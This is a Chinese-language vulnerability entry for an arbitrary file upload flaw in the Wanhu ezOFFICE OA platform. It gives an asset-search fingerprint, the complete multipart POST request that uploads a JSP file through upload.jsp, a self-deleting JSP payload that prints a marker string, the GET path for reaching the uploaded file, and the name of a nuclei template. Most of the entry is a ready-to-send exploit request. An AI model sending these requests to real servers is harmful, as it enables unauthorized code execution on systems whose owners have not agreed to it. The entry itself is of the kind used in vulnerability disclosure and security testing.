# 万户协同办公平台portletSettingId存在任意文件上传漏洞

- **系统**：万户协同办公平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=dir HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 286`　`Content-Type: multipart/form-data; boundary=----othotlvgwwannsrjurc6`　`Cookie: OASESSIONID=416B4CE965CD27DEED8197A8528A33E6`

**请求体 / payload**
```
------othotlvgwwannsrjurc6
Content-Disposition: form-data; name="file"; filename="hc0qc.jsp"
Content-Type: application/octet-stream
<%out.println("m7kmpz4ucpdtkbld4sxy");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------othotlvgwwannsrjurc6--

上传文件位置
GET /defaultroot/upload/dir/202312/2023121622252900709344996.jsp HTTP/1.1
Host: {hostname}
Cookie: OASESSIONID=416B4CE965CD27DEED8197A8528A33E6; OASESSIONID=D4E78F785F0A319A594DC801BBB486AD

nuclei脚本\
\[wanhu-fileupload-common-upload.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 万户协同办公平台portletSettingId存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezoffice